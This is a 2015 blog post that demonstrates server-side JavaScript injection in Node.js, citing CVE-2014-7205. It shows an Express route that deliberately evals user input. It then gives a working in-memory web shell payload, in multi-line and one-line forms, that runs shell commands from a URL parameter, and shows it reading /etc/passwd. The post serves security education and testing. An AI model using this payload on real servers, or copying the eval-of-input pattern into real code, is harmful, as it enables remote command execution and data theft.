---
layout: post
title:  "SSJS Web Shell Injection"
date:   2015-01-31 12:02:03
categories: node
---

I've recently become interested in real world examples of vulnerabilities in Node.js applications, which allow `Server Side Javascript Injection`. One advisory I came across was <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7205">CVE-2014-7205</a> discovered by Jarda Kotěšovec in a <a href="https://github.com/hapijs/bassmaster/commit/b751602d8cb7194ee62a61e085069679525138c4">Basmaster plugin</a> which allows arbitrary Javascript injection.

I decided to mock up a simple example of user input passed to an eval() execution sink, to demonstrate an injection of a simple web shell into the server. This web shell will only exist within the current node.js process, and will not be written to disk.

This demo application will only allow a single user input selection to keep things simple:
![Demo app](/assets/SSJS_ws1.png)

Vulnerable code (user input passed to an eval execution sink):
{% highlight javascript %}
router.post('/demo1', function(req, res) {
  var year = eval("year = (" + req.body.year + ")");
  var date = new Date();

  var futureAge = 2050 - year;

  res.render('demo1',
    {
      title: 'Future Age',
      output: futureAge
    });
});
{% endhighlight %}

In this example res.write('SSJS Injection') is injected, and the server will return that string in the page response:
![Demo app](/assets/SSJS_ws2.png)

So we can perform arbitrary SSJS injection on this location. What about injecting a web shell that will start up after 5 seconds, listening on TCP/8000?
{% highlight javascript %}
setTimeout(function() {
    require('http').createServer(function(req, res) {
        res.writeHead(200, {
            "Content-Type": "text/plain"
        });
        require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e, s, st) {
            res.end(s);
        });
    }).listen(8000);
}, 5000)
{% endhighlight %}

One line web shell:
{% highlight javascript %}
setTimeout(function() { require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(8000); }, 5000)
{% endhighlight %}

Because we are inserting code which will be eval'd by the application, the web shell will not be written to disk, and execution will be performed from the existing node process. 

Injection of the web shell (application continues to respond normally):
![Demo app](/assets/SSJS_ws3.png)

Execution of `cat /etc/passwd` using the web shell:
![Demo app](/assets/SSJS_ws4.png)

Execution of `ls -la /etc`:
![Demo app](/assets/SSJS_ws5.png)

This is a really simple example of an application with a SSJS injection vulnerability. Another thing to note is that tools to identify web application vulnerabilities may not have support to detect this vulnerability. At the time of this writing, Burp Suite v1.6.10 did not identify a SSJS injection vulnerability in the demo application.

- [s1gnalCha0s](https://craigarendt.com)